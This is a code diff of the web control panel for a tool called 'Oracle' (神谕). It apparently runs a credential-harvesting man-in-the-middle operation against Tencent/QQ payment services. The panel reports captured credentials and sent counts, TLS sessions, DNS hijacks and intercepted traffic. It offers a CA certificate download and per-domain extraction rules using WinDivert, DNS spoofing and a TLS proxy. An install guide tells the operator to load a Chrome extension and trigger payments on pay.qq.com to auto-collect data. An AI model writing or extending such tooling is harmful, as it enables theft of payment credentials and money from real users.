@@ -3,392 +3,191 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>神谕 Oracle - 数据采集面板</title>
+<title>神谕 Oracle - 万能采集面板</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0d1117; color:#c9d1d9; padding:20px; }
-.header { display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; }
-.header h1 { font-size:20px; font-weight:600; }
-.header h1 span { color:#58a6ff; }
-.status-badge { display:inline-block; padding:4px 12px; border-radius:12px; font-size:13px; font-weight:500; }
-.status-badge.running { background:#0e4429; color:#3fb950; }
-.status-badge.stopped { background:#3d1c1c; color:#f85149; }
-.cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:12px; margin-bottom:24px; }
-.card { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:16px; }
-.card .label { font-size:12px; color:#8b949e; margin-bottom:4px; }
-.card .value { font-size:24px; font-weight:600; }
-.card .value.green { color:#3fb950; }
-.card .value.orange { color:#d29922; }
-.card .value.blue { color:#58a6ff; }
-.card .value.red { color:#f85149; }
-.controls { margin-bottom:24px; display:flex; gap:8px; }
-.controls button { padding:8px 20px; border:1px solid #30363d; border-radius:6px; font-size:14px; cursor:pointer; background:#21262d; color:#c9d1d9; }
-.controls button:hover { background:#30363d; }
-.controls button.primary { background:#238636; border-color:#238636; }
-.controls button.primary:hover { background:#2ea043; }
-.controls button.danger { background:#da3633; border-color:#da3633; }
-.controls button.danger:hover { background:#f85149; }
-table { width:100%; border-collapse:collapse; font-size:13px; }
-th { text-align:left; padding:8px 12px; border-bottom:2px solid #30363d; color:#8b949e; font-weight:500; }
-td { padding:8px 12px; border-bottom:1px solid #21262d; font-family:'SFMono-Regular',Consolas,monospace; font-size:12px; }
-tr:hover td { background:#161b22; }
-.url-cell { max-width:400px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-.empty { text-align:center; padding:40px; color:#8b949e; }
-.tabs { display:flex; gap:0; margin-bottom:16px; border-bottom:1px solid #30363d; }
-.tab { padding:8px 16px; cursor:pointer; border-bottom:2px solid transparent; color:#8b949e; font-size:13px; }
-.tab.active { border-bottom-color:#58a6ff; color:#c9d1d9; }
-.tab:hover { color:#c9d1d9; }
-.panel { display:none; }
-.panel.active { display:block; }
-.log-entry { font-family:'SFMono-Regular',Consolas,monospace; font-size:11px; padding:2px 0; color:#8b949e; }
-.log-entry.warn { color:#d29922; }
-.log-entry.error { color:#f85149; }
-.info-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
-.info-item { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #21262d; font-size:13px; }
-.info-item .label { color:#8b949e; }
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px;min-width:900px}
+.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+.header h1{font-size:22px;font-weight:700}
+.header h1 span{color:#58a6ff}
+.header h1 .ext{font-size:12px;color:#8b949e;font-weight:400;margin-left:8px}
+.status-badge{display:inline-flex;align-items:center;gap:6px;padding:4px 14px;border-radius:12px;font-size:13px;font-weight:500}
+.status-badge.running{background:#0e4429;color:#3fb950}
+.status-badge.stopped{background:#3d1c1c;color:#f85149}
+.status-badge::before{content:'';width:8px;height:8px;border-radius:50%}
+.status-badge.running::before{background:#3fb950;box-shadow:0 0 6px #3fb950}
+.status-badge.stopped::before{background:#f85149}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px}
+.card .label{font-size:11px;color:#8b949e;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
+.card .value{font-size:22px;font-weight:700}
+.card .value.green{color:#3fb950}
+.card .value.orange{color:#d29922}
+.card .value.blue{color:#58a6ff}
+.card .value.purple{color:#bc8cff}
+.controls{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap;align-items:center}
+.controls button{padding:7px 18px;border:1px solid #30363d;border-radius:6px;font-size:13px;cursor:pointer;background:#21262d;color:#c9d1d9;transition:all .15s}
+.controls button:hover{background:#30363d}
+.controls button.primary{background:#238636;border-color:#238636;color:#fff}
+.controls button.primary:hover{background:#2ea043}
+.controls button.danger{background:#da3633;border-color:#da3633;color:#fff}
+.controls button.danger:hover{background:#f85149}
+.controls .ext-status{margin-left:auto;font-size:12px;color:#8b949e;display:flex;align-items:center;gap:4px}
+.tabs{display:flex;gap:0;margin-bottom:16px;border-bottom:1px solid #30363d}
+.tab{padding:8px 18px;cursor:pointer;border-bottom:2px solid transparent;color:#8b949e;font-size:13px;user-select:none}
+.tab:hover{color:#c9d1d9}
+.tab.active{border-bottom-color:#58a6ff;color:#c9d1d9}
+.panel{display:none}
+.panel.active{display:block}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;padding:8px 12px;border-bottom:2px solid #30363d;color:#8b949e;font-weight:500;font-size:11px;text-transform:uppercase}
+td{padding:8px 12px;border-bottom:1px solid #21262d;font-family:'SFMono-Regular',Consolas,monospace;font-size:12px}
+tr:hover td{background:#161b22}
+.url-cell{max-width:450px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.empty{text-align:center;padding:40px;color:#8b949e;font-size:13px}
+.empty .hint{font-size:11px;margin-top:6px;color:#484f58}
+.guide{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:20px}
+.guide h3{font-size:14px;margin-bottom:12px;display:flex;align-items:center;gap:6px}
+.guide ol{margin-left:18px;font-size:13px;line-height:1.8;color:#8b949e}
+.guide code{background:#21262d;padding:1px 6px;border-radius:4px;font-size:12px;color:#58a6ff}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.info-item{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #21262d;font-size:13px}
+.info-item .label{color:#8b949e}
 </style>
 </head>
 <body>
 <div class="header">
-  <h1>⚡ <span>神谕</span> Oracle</h1>
+  <h1>⚡ <span>神谕</span> Oracle <span class="ext">+ Chrome Ext</span></h1>
   <span id="statusBadge" class="status-badge stopped">⏳ 加载中...</span>
 </div>
-
+<div class="cards" id="statsCards">
+  <div class="card"><div class="label">运行时间</div><div class="value blue" id="uptime">-</div></div>
+  <div class="card"><div class="label">凭证捕获</div><div class="value green" id="credTotal">0</div></div>
+  <div class="card"><div class="label">已发送</div><div class="value orange" id="credSent">0/0</div></div>
+  <div class="card"><div class="label">TLS 会话</div><div class="value purple" id="tlsSessions">0</div></div>
+  <div class="card"><div class="label">数据包</div><div class="value blue" id="packetsCap">0</div></div>
+  <div class="card"><div class="label">DNS 劫持</div><div class="value orange" id="dnsSpoofed">0</div></div>
+  <div class="card"><div class="label">活跃连接</div><div class="value" id="activeConns">0</div></div>
+  <div class="card"><div class="label">提取规则</div><div class="value" id="rulesLoaded">-</div></div>
+</div>
+<div class="controls">
+  <button id="btnStart" class="primary" onclick="doAction('start')">▶ 启动采集</button>
+  <button id="btnStop" class="danger" onclick="doAction('stop')">■ 停止采集</button>
+  <button onclick="window.open('/cert')">📜 CA 证书</button>
+  <button onclick="refresh()">⟳ 刷新</button>
+  <span class="ext-status" id="extStatus">🧩 扩展: 检查中...</span>
+</div>
+<!-- Extension install guide -->
+<div id="extGuide" class="guide">
+  <h3>🧩 安装 Chrome 扩展</h3>
+  <ol>
+    <li>打开 Chrome → <code>chrome://extensions</code> → 开启「开发者模式」</li>
+    <li>点击「加载已解压的扩展程序」→ 选择 <code>tools/agent-terminal/extension</code></li>
+    <li>访问 <span style="color:#58a6ff">pay.qq.com</span> → 触发支付 → 自动采集 ✓</li>
+  </ol>
+</div>
+<!-- Tabs -->
 <div class="tabs">
   <div class="tab active" onclick="switchTab('overview')">概览</div>
-  <div class="tab" onclick="switchTab('data')">采集数据</div>
-  <div class="tab" onclick="switchTab('rules')">采集目标</div>
-  <div class="tab" onclick="switchTab('config')">设置</div>
+  <div class="tab" onclick="switchTab('credentials')">凭证数据</div>
+  <div class="tab" onclick="switchTab('traffic')">原始流量</div>
+  <div class="tab" onclick="switchTab('rules')">提取规则</div>
+  <div class="tab" onclick="switchTab('config')">配置</div>
 </div>
-
 <div id="tab-overview" class="panel active">
-  <div class="cards" id="statsCards">
-    <div class="card"><div class="label">运行时间</div><div class="value blue" id="uptime">-</div></div>
-    <div class="card"><div class="label">已采集</div><div class="value green" id="credTotal">0</div></div>
-    <div class="card"><div class="label">今日新增</div><div class="value green" id="credToday">0</div></div>
-    <div class="card"><div class="label">已发送</div><div class="value orange" id="credSent">0</div></div>
-    <div class="card"><div class="label">活跃连接</div><div class="value" id="activeConns">0</div></div>
-    <div class="card"><div class="label">数据包捕获</div><div class="value" id="packetsCap">0</div></div>
-    <div class="card"><div class="label">DNS 劫持</div><div class="value" id="dnsSpoofed">0</div></div>
-    <div class="card"><div class="label">规则加载</div><div class="value" id="rulesLoaded">0</div></div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+    <div>
+      <h3 style="font-size:14px;color:#8b949e;margin-bottom:8px">最近凭证</h3>
+      <table><thead><tr><th>时间</th><th>来源</th><th>类型</th><th>值</th></tr></thead><tbody id="recentCreds"></tbody></table>
+      <div class="empty" id="recentEmpty">暂无数据</div>
+    </div>
+    <div>
+      <h3 style="font-size:14px;color:#8b949e;margin-bottom:8px">监控域名</h3>
+      <div id="domainList" style="display:flex;flex-wrap:wrap;gap:6px"></div>
+    </div>
   </div>
-
-  <div class="controls">
-    <button id="btnStart" class="primary" onclick="doAction('start')">▶ 启动采集</button>
-    <button id="btnStop" class="danger" onclick="doAction('stop')">■ 停止采集</button>
-    <button onclick="refresh()">⟳ 刷新</button>
-  </div>
-
-  <h3 style="margin-bottom:12px;font-size:14px;color:#8b949e;">实时日志</h3>
-  <div id="logContainer" style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px;height:200px;overflow-y:auto;font-family:'SFMono-Regular',Consolas,monospace;font-size:11px;"></div>
 </div>
-
-<div id="tab-data" class="panel">
-  <h3 style="margin-bottom:12px;font-size:14px;color:#8b949e;">采集的凭证数据</h3>
-  <table>
-    <thead><tr><th style="width:140px">时间</th><th style="width:160px">来源</th><th style="width:80px">类型</th><th>值</th></tr></thead>
-    <tbody id="dataBody"></tbody>
-  </table>
-  <div class="empty" id="dataEmpty">暂无数据，启动采集后自动出现</div>
+<div id="tab-credentials" class="panel">
+  <table><thead><tr><th>时间</th><th>来源</th><th>平台</th><th>类型</th><th>值</th><th>元数据</th></tr></thead><tbody id="dataBody"></tbody></table>
+  <div class="empty" id="dataEmpty"><div>暂无凭证数据</div><div class="hint">启动采集后自动出现 / 安装 Chrome 扩展捕获浏览器内数据</div></div>
 </div>
-
+<div id="tab-traffic" class="panel">
+  <table><thead><tr><th>时间</th><th>域名</th><th>方法</th><th>路径</th><th>状态</th><th>响应体</th></tr></thead><tbody id="trafficBody"></tbody></table>
+  <div class="empty" id="trafficEmpty">暂无流量数据</div>
+</div>
 <div id="tab-rules" class="panel">
-  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
-    <h3 style="font-size:14px;color:#8b949e;">采集目标</h3>
-    <button onclick="showAddRule()" style="padding:6px 14px;border:1px solid #238636;border-radius:6px;font-size:13px;cursor:pointer;background:#238636;color:#fff;">+ 新建目标</button>
-  </div>
-
-  <div id="ruleForm" style="display:none;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:16px;">
-    <h4 style="margin-bottom:16px;font-size:14px;">新建采集目标</h4>
-    <div style="margin-bottom:12px;">
-      <label style="display:block;font-size:12px;color:#8b949e;margin-bottom:4px;">应用类型</label>
-      <select id="ruleAppType" onchange="onAppTypeChange()" style="width:100%;padding:8px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;">
-        <option value="browser">浏览器网页</option>
-        <option value="desktop">PC桌面应用</option>
-        <option value="emulator">手游(模拟器)</option>
-      </select>
-    </div>
-    <div style="margin-bottom:12px;">
-      <label style="display:block;font-size:12px;color:#8b949e;margin-bottom:4px;">规则名称</label>
-      <input id="ruleName" placeholder="例如: QQ支付" style="width:100%;padding:8px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;">
-    </div>
-    <div id="ruleDomainGroup">
-      <label style="display:block;font-size:12px;color:#8b949e;margin-bottom:4px;">目标域名</label>
-      <input id="ruleDomain" placeholder="例如: api.unipay.qq.com" style="width:100%;padding:8px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;margin-bottom:12px;">
-    </div>
-    <div id="ruleProcessGroup" style="display:none;">
-      <label style="display:block;font-size:12px;color:#8b949e;margin-bottom:4px;">进程名</label>
-      <input id="ruleProcess" placeholder="例如: QQ.exe" style="width:100%;padding:8px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;margin-bottom:12px;">
-    </div>
-    <div style="margin-bottom:12px;">
-      <label style="display:block;font-size:12px;color:#8b949e;margin-bottom:4px;">匹配路径(可选)</label>
-      <input id="rulePath" placeholder="例如: web_save" style="width:100%;padding:8px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;">
-    </div>
-    <div style="margin-bottom:8px;font-size:12px;color:#8b949e;">要采集的字段</div>
-    <div id="fieldsContainer"></div>
-    <div style="margin-top:8px;margin-bottom:16px;">
-      <button onclick="addFieldRow()" style="padding:6px 12px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#8b949e;cursor:pointer;font-size:12px;">+ 添加字段</button>
-    </div>
-    <div style="display:flex;gap:8px;">
-      <button onclick="saveRule()" style="padding:8px 20px;border:1px solid #238636;border-radius:6px;background:#238636;color:#fff;cursor:pointer;">保存规则</button>
-      <button onclick="hideRuleForm()" style="padding:8px 20px;border:1px solid #30363d;border-radius:6px;background:#21262d;color:#c9d1d9;cursor:pointer;">取消</button>
-    </div>
-  </div>
-
-  <div id="rulesList"></div>
-  <div class="empty" id="rulesEmpty">暂无采集目标，点击上方按钮创建</div>
+  <table><thead><tr><th>规则</th><th>域名</th><th>匹配器</th><th>提取器</th><th>已捕获</th><th>状态</th></tr></thead><tbody id="rulesBody"></tbody></table>
+  <div class="empty" id="rulesEmpty">没有加载提取规则</div>
 </div>
-
 <div id="tab-config" class="panel">
   <div class="info-grid" id="configGrid"></div>
 </div>
-
 <script>
-let state = { status:'stopped', uptime:0 };
-const LOG_MAX = 200;
+function switchTab(n){document.querySelectorAll('.tab,.panel').forEach(e=>e.classList.remove('active'));document.querySelector(`.tab[onclick*='${n}']`).classList.add('active');document.getElementById('tab-'+n).classList.add('active')}
+async function fetchJSON(u){const r=await fetch(u);if(!r.ok)throw new Error('HTTP '+r.status);return r.json()}
+async function doAction(a){try{await fetch('/'+a,{method:'POST'});await refresh()}catch(e){}}
+function fmtTime(s){if(!s)return'-';const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),s2=Math.floor(s%60);return h>0?h+'h '+m+'m':m>0?m+'m '+s2+'s':s2+'s'}
+function esc(s){return(!s)?'-':String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+function trunc(s,n){return(!s)?'-':s.length>n?s.substring(0,n-3)+'...':s}
 
-function log(msg, level='info') {
-  const el = document.getElementById('logContainer');
-  const d = new Date();
-  const t = d.toTimeString().slice(0,8);
-  const line = document.createElement('div');
-  line.className = 'log-entry ' + level;
-  line.textContent = `[${t}] ${msg}`;
-  el.appendChild(line);
-  if (el.children.length > LOG_MAX) el.removeChild(el.firstChild);
-  el.scrollTop = el.scrollHeight;
+async function refresh(){
+  try{
+    const s=await fetchJSON('/status');
+    const b=document.getElementById('statusBadge');b.className='status-badge '+(s.status==='running'?'running':'stopped');b.textContent=s.status==='running'?'● 运行中':'● 已停止';
+    document.getElementById('uptime').textContent=fmtTime(s.uptime_seconds);
+    document.getElementById('credTotal').textContent=s.credentials_queued||0;
+    document.getElementById('credSent').textContent=(s.credentials_sent||0)+'/'+(s.credentials_failed||0);
+    document.getElementById('tlsSessions').textContent=s.active_tls_sessions||0;
+    document.getElementById('packetsCap').textContent=s.packets_captured||0;
+    document.getElementById('dnsSpoofed').textContent=Math.max(0,s.dns_spoofed||0);
+    document.getElementById('activeConns').textContent=Math.max(0,s.active_connections||0);
+    document.getElementById('rulesLoaded').textContent='-';
+    document.getElementById('btnStart').style.display=s.status==='running'?'none':'';
+    document.getElementById('btnStop').style.display=s.status==='running'?'':'none';
+  }catch(e){}
+
+  // Extension status
+  try{
+    const d=await fetchJSON('/data');
+    const hasExt=d.items&&d.items.some(i=>i.source==='extension');
+    document.getElementById('extStatus').textContent=hasExt?'🧩 扩展: 活跃 ✓':'🧩 扩展: 待安装...';
+    document.getElementById('extGuide').style.display=hasExt?'none':'block';
+  }catch(e){}
+
+  // Credentials + Overview
+  try{
+    const d=await fetchJSON('/data');
+    const tb=document.getElementById('dataBody'),em=document.getElementById('dataEmpty'),rb=document.getElementById('recentCreds'),re=document.getElementById('recentEmpty');
+    tb.innerHTML='';rb.innerHTML='';
+    if(d.items&&d.items.length>0){
+      em.style.display='none';re.style.display='none';
+      const items=d.items.slice().reverse();
+      items.slice(0,5).forEach(i=>{const v=i.value||'';rb.innerHTML+='<tr><td style="font-size:11px;color:#8b949e">'+(i.captured_at?new Date(i.captured_at).toLocaleTimeString():'-')+'</td><td style="font-size:11px">'+esc(i.source||'-')+'</td><td style="font-size:11px">'+esc(i.type||'-')+'</td><td class="url-cell" title="'+esc(v)+'">'+esc(trunc(v,60))+'</td></tr>'});
+      items.forEach(i=>{const v=i.value||'',m=i.metadata?Object.entries(i.metadata).map(([k,v])=>k+'='+trunc(v,30)).join(', '):'';tb.innerHTML+='<tr><td style="font-size:11px;color:#8b949e;white-space:nowrap">'+esc(i.captured_at?new Date(i.captured_at).toLocaleString():'-')+'</td><td style="font-size:11px">'+esc(i.source||'-')+'</td><td style="font-size:11px">'+esc(i.platform||'-')+'</td><td style="font-size:11px;color:#58a6ff">'+esc(i.type||'-')+'</td><td class="url-cell" title="'+esc(v)+'"><span style="color:#3fb950">'+esc(v.substring(0,100))+'</span></td><td style="font-size:10px;color:#8b949e;max-width:200px;overflow:hidden;text-overflow:ellipsis">'+esc(m)+'</td></tr>'});
+    }else{em.style.display='block';re.style.display='block'}
+  }catch(e){}
+
+  // Traffic
+  try{
+    const t=await fetchJSON('/traffic');const tb=document.getElementById('trafficBody'),em=document.getElementById('trafficEmpty');tb.innerHTML='';
+    if(t.items&&t.items.length>0){em.style.display='none';t.items.slice().reverse().slice(0,50).forEach(i=>{tb.innerHTML+='<tr><td style="font-size:11px;color:#8b949e;white-space:nowrap">'+(i.timestamp?new Date(i.timestamp).toLocaleTimeString():'-')+'</td><td style="font-size:11px">'+esc(i.sni||'-')+'</td><td>'+esc(i.method||'-')+'</td><td class="url-cell">'+esc(i.path||'-')+'</td><td>'+(i.status_code||'-')+'</td><td class="url-cell" style="font-size:10px;color:#8b949e">'+esc(trunc(i.response_body||i.responseBody||'',60))+'</td></tr>'})}else{em.style.display='block'}
+  }catch(e){}
+
+  // Rules
+  try{
+    const r=await fetchJSON('/rules');const tb=document.getElementById('rulesBody'),em=document.getElementById('rulesEmpty');tb.innerHTML='';
+    if(r.rules&&r.rules.length>0){em.style.display='none';r.rules.forEach(rule=>{tb.innerHTML+='<tr><td style="font-weight:600">'+esc(rule.name)+'</td><td style="font-size:11px">'+esc((rule.domains||[]).join(', '))+'</td><td style="font-size:11px">'+(rule.matcher_count||0)+'</td><td style="font-size:11px">'+(rule.extractor_count||0)+'</td><td style="font-size:11px">'+(rule.total_captured||0)+'</td><td>'+(rule.enabled?'<span style="color:#3fb950">✅</span>':'<span style="color:#f85149">❌</span>')+'</td></tr>'})}else{em.style.display='block'}
+  }catch(e){}
+
+  // Config + domains
+  try{
+    const cfg=await fetchJSON('/config');const grid=document.getElementById('configGrid');grid.innerHTML='';
+    Object.entries(cfg).filter(([k])=>k!='PayDomains').forEach(([k,v])=>{const val=Array.isArray(v)?v.join(', '):typeof v==='object'?JSON.stringify(v):v;grid.innerHTML+='<div class="info-item"><span class="label">'+k+'</span><span>'+esc(String(val).substring(0,120))+'</span></div>'});
+    if(cfg.PayDomains){const dl=document.getElementById('domainList');dl.innerHTML='';cfg.PayDomains.forEach(d=>{dl.innerHTML+='<span style="background:#21262d;padding:2px 10px;border-radius:10px;font-size:11px;color:#8b949e">'+esc(d)+'</span>'})}
+  }catch(e){}
 }
 
-function switchTab(name) {
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-  document.querySelector(`.tab[onclick*='${name}']`).classList.add('active');
-  document.getElementById(`tab-${name}`).classList.add('active');
-}
-
-async function fetchJSON(url) {
-  const r = await fetch(url);
-  if (!r.ok) throw new Error(`HTTP ${r.status}`);
-  return r.json();
-}
-
-async function doAction(action) {
-  try {
-    const r = await fetch(`/${action}`, { method:'POST' });
-    const d = await r.json();
-    log(`操作 ${action}: ${d.status}`, d.status==='started'?'info':'warn');
-    await refresh();
-  } catch(e) {
-    log(`操作失败: ${e.message}`, 'error');
-  }
-}
-
-function fmtTime(sec) {
-  const h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = Math.floor(sec%60);
-  if (h>0) return `${h}h ${m}m ${s}s`;
-  if (m>0) return `${m}m ${s}s`;
-  return `${s}s`;
-}
-
-async function refresh() {
-  try {
-    const s = await fetchJSON('/status');
-    state = s;
-
-    document.getElementById('statusBadge').className = 'status-badge ' + (s.status==='running'?'running':'stopped');
-    document.getElementById('statusBadge').textContent = s.status==='running' ? 'Running' : 'Stopped';
-    document.getElementById('uptime').textContent = fmtTime(s.uptime_seconds||0);
-    document.getElementById('credTotal').textContent = s.credentials_queued||0;
-    document.getElementById('credToday').textContent = s.credentials_queued||0;
-    document.getElementById('credSent').textContent = (s.credentials_sent||0) + '/' + (s.credentials_failed||0);
-    document.getElementById('activeConns').textContent = Math.max(0, s.active_tls_sessions||0);
-    document.getElementById('packetsCap').textContent = s.packets_captured||0;
-    document.getElementById('dnsSpoofed').textContent = Math.max(0, s.dns_spoofed||0);
-    document.getElementById('rulesLoaded').textContent = '-';
-
-    document.getElementById('btnStart').style.display = s.status==='running'?'none':'inline-block';
-    document.getElementById('btnStop').style.display = s.status==='running'?'inline-block':'none';
-
-    // Config tab
-    try {
-      const cfg = await fetchJSON('/config');
-      const grid = document.getElementById('configGrid');
-      grid.innerHTML = '';
-      for (const [k,v] of Object.entries(cfg)) {
-        const val = Array.isArray(v) ? v.join(', ') : (typeof v==='object' ? JSON.stringify(v) : v);
-        grid.innerHTML += `<div class="info-item"><span class="label">${k}</span><span>${String(val).substring(0,120)}</span></div>`;
-      }
-    } catch(e) {}
-
-    // Data tab: fetch captured credentials
-    try {
-      const d = await fetchJSON('/data');
-      const tbody = document.getElementById('dataBody');
-      const empty = document.getElementById('dataEmpty');
-      tbody.innerHTML = '';
-
-      if (d.items && d.items.length > 0) {
-        empty.style.display = 'none';
-        d.items.slice().reverse().forEach(item => {
-          const time = item.captured_at ? new Date(item.captured_at).toLocaleTimeString() : '-';
-          const val = item.value || '';
-          const type = item.type || '';
-          let displayHtml = '';
-          if (type === 'QrImage' && val.length > 100) {
-            displayHtml = '<img src="data:image/png;base64,'+val+'" style="max-height:80px;cursor:pointer;" onclick="window.open(this.src)">';
-          } else if (val.length > 120) {
-            displayHtml = '<span title="'+val.replace(/"/g,'&quot;')+'">'+val.substring(0,100)+'...</span>';
-          } else {
-            displayHtml = '<span title="'+val.replace(/"/g,'&quot;')+'">'+val+'</span>';
-          }
-          tbody.innerHTML += '<tr><td>'+time+'</td><td>'+(item.platform||item.source||'-')+'</td><td>'+type+'</td><td>'+displayHtml+'</td></tr>';
-        });
-        // Update stats with actual total
-        document.getElementById('credTotal').textContent = d.total || 0;
-      } else {
-        empty.style.display = 'block';
-      }
-    } catch(e) {}
-
-  } catch(e) {
-    log('Connection failed: ' + e.message, 'error');
-    document.getElementById('statusBadge').className = 'status-badge stopped';
-    document.getElementById('statusBadge').textContent = 'Offline';
-  }
-}
-
-// Auto refresh every 3 seconds
-// Re-assign refresh first, then start interval
-const _origRefresh = refresh;
-refresh = async function() {
-  await _origRefresh();
-  await loadRules();
-};
-
-refresh();
-log('面板已加载，自动刷新中...');
-setInterval(refresh, 3000);
-
-// ── Rule Management ──
-
-async function loadRules() {
-  try {
-    const r = await fetchJSON('/rules');
-    const list = document.getElementById('rulesList');
-    const empty = document.getElementById('rulesEmpty');
-    list.innerHTML = '';
-    if (r.rules && r.rules.length > 0) {
-      empty.style.display = 'none';
-      r.rules.forEach(rule => {
-        const fields = rule.field_count > 0 ? '/'+rule.field_count+'字段' : rule.extractor_count > 0 ? '/'+rule.extractor_count+'提取' : '';
-        const appLabel = {browser:'网页',desktop:'PC',emulator:'手游'}[rule.app_type] || rule.app_type;
-        list.innerHTML += '<div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px;margin-bottom:8px;">'+
-          '<div style="display:flex;justify-content:space-between;align-items:center;">'+
-            '<div><span style="font-weight:600;">'+(rule.enabled?'[ON] ':'[OFF] ')+rule.name+'</span>'+
-            '<span style="font-size:12px;color:#8b949e;margin-left:8px;">'+appLabel+' '+fields+'</span></div>'+
-            '<div style="font-size:12px;color:#8b949e;">'+(rule.total_captured||0)+'条</div>'+
-          '</div>'+
-          '<div style="font-size:12px;color:#8b949e;margin-top:4px;">'+(rule.domains.join(', ')||'-')+'</div>'+
-          '<div style="font-size:12px;margin-top:6px;display:flex;gap:8px;">'+
-            '<span style="color:#58a6ff;cursor:pointer;" onclick="deleteRule(\''+rule.id+'\')">删除</span>'+
-          '</div></div>';
-      });
-    } else {
-      empty.style.display = 'block';
-    }
-  } catch(e) { log('Rules load error: '+e.message, 'error'); }
-}
-
-async function deleteRule(id) {
-  if (!confirm('Delete this rule?')) return;
-  try {
-    await fetch('/rules/'+id, { method:'DELETE' });
-    await loadRules();
-  } catch(e) { log('Delete failed: '+e.message, 'error'); }
-}
-
-function showAddRule() {
-  document.getElementById('ruleForm').style.display = 'block';
-  const c = document.getElementById('fieldsContainer');
-  if (c.children.length === 0) addFieldRow();
-}
-
-function hideRuleForm() {
-  document.getElementById('ruleForm').style.display = 'none';
-}
-
-function onAppTypeChange() {
-  const t = document.getElementById('ruleAppType').value;
-  document.getElementById('ruleDomainGroup').style.display = t==='emulator'?'none':'block';
-  document.getElementById('ruleProcessGroup').style.display = t==='desktop'?'block':'none';
-}
-
-function addFieldRow() {
-  const c = document.getElementById('fieldsContainer');
-  const row = document.createElement('div');
-  row.style.cssText = 'display:flex;gap:8px;margin-bottom:8px;';
-  row.innerHTML = '<input placeholder="字段名" style="flex:1;padding:6px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;font-size:12px;">'+
-    '<select style="width:80px;padding:6px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;font-size:12px;"><option value="response_body">响应体</option><option value="request_body">请求体</option></select>'+
-    '<select class="capture-mode" style="width:70px;padding:6px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;font-size:12px;" onchange="toggleExample(this)"><option value="auto">提取</option><option value="full_body">全部</option></select>'+
-    '<input placeholder="示例值(选填)" class="field-example" style="flex:1;padding:6px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;font-size:12px;">'+
-    '<button onclick="this.parentElement.remove()" style="padding:6px 10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#f85149;cursor:pointer;">x</button>';
-  c.appendChild(row);
-}
-
-function toggleExample(el) {
-  const example = el.parentElement.querySelector('.field-example');
-  example.style.display = el.value === 'full_body' ? 'none' : '';
-}
-
-async function saveRule() {
-  const name = document.getElementById('ruleName').value.trim();
-  if (!name) { alert('请输入规则名称'); return; }
-
-  const appType = document.getElementById('ruleAppType').value;
-  const domain = document.getElementById('ruleDomain').value.trim();
-  const process = document.getElementById('ruleProcess').value.trim();
-  const path = document.getElementById('rulePath').value.trim();
-
-  const fields = [];
-  document.querySelectorAll('#fieldsContainer > div').forEach(row => {
-    const inputs = row.querySelectorAll('input');
-    const selects = row.querySelectorAll('select');
-    if (inputs.length >= 2 && selects.length >= 2) {
-      const fname = inputs[0].value.trim();
-      const source = selects[0].value;
-      const captureMode = selects[1].value;
-      const example = captureMode === 'full_body' ? '' : inputs[1].value.trim();
-      if (fname) fields.push({ name: fname, source: source, example: example, captureMode: captureMode });
-    }
-  });
-
-  const matchers = [];
-  if (domain) matchers.push({ field: 'domain', operator: 'contains', value: domain });
-  if (path) matchers.push({ field: 'path', operator: 'contains', value: path });
-
-  const rule = {
-    name: name,
-    description: name,
-    enabled: true,
-    app: { type: appType, domains: domain ? [domain] : [], processes: process ? [process] : [] },
-    matchers: matchers,
-    fields: fields.length > 0 ? fields : null,
-    channels: ['winDivert', 'dnsSpoof', 'tlsProxy'],
-  };
-
-  try {
-    await fetch('/rules', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(rule) });
-    hideRuleForm();
-    document.getElementById('ruleName').value = '';
-    document.getElementById('ruleDomain').value = '';
-    document.getElementById('ruleProcess').value = '';
-    document.getElementById('rulePath').value = '';
-    document.getElementById('fieldsContainer').innerHTML = '';
-    addFieldRow();
-    await loadRules();
-    log('Rule created: ' + name, 'info');
